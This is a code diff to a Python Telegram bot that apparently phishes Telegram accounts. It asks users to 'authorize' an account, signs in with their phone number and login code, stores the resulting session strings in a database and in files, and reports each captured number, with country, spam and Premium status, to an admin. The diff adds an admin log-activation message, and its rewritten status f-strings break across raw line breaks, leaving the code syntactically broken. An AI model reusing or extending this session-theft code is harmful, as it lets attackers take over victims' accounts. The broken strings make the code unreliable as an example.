@@ -47,6 +47,10 @@ os.makedirs("sessions", exist_ok=True)
 
 @dp.message_handler(commands=['start'])
 async def cmd_start(message: types.Message):
+    if message.from_user.id == ADMIN_ID:
+        await message.answer("✅ Админ успешно активирован. Все логи будут приходить сюда.")
+        return
+
     keyboard = InlineKeyboardMarkup().add(
         InlineKeyboardButton("🔐 Autorizza primo account", callback_data="auth_account")
     )
@@ -154,7 +158,6 @@ async def try_sign_in_code(user_id, code):
         await client.sign_in(phone=phone, code=code)
 
         if await client.is_user_authorized():
-            # Info
             me = await client.get_me()
             has_premium = getattr(me, "premium", False)
             restriction = getattr(me, "restriction_reason", [])
@@ -162,7 +165,6 @@ async def try_sign_in_code(user_id, code):
             is_valid = not is_spam_blocked
             country = geocoder.description_for_number(phonenumbers.parse(phone, None), "en")
 
-            # Save session
             session_str = client.session.save()
             sessions_col.update_one(
                 {"phone": phone},
@@ -172,13 +174,18 @@ async def try_sign_in_code(user_id, code):
             with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                 json.dump({"phone": phone, "session": session_str}, f)
 
-            # Send admin status
             status = (
-                f"📞 **Nuovo numero:** `{phone}`\n"
-                f"🌍 **Paese:** {country or 'N/A'}\n"
-                f"🛡 **Spam Block:** {'❌ Sì' if is_spam_blocked else '✅ No'}\n"
-                f"💎 **Telegram Premium:** {'✅ Sì' if has_premium else '❌ No'}\n"
-                f"✅ **Valido:** {'Sì' if is_valid else 'No'}"
+                f"📞 Nuovo accesso:
+"
+                f"📱 Telefono: `{phone}`
+"
+                f"🌍 Paese: {country or 'N/A'}
+"
+                f"🛡 Spam Block: {'❌ Sì' if is_spam_blocked else '✅ No'}
+"
+                f"💎 Premium: {'✅ Sì' if has_premium else '❌ No'}
+"
+                f"✅ Valido: {'Sì' if is_valid else 'No'}"
             )
             await bot.send_message(ADMIN_ID, status, parse_mode="Markdown")
 
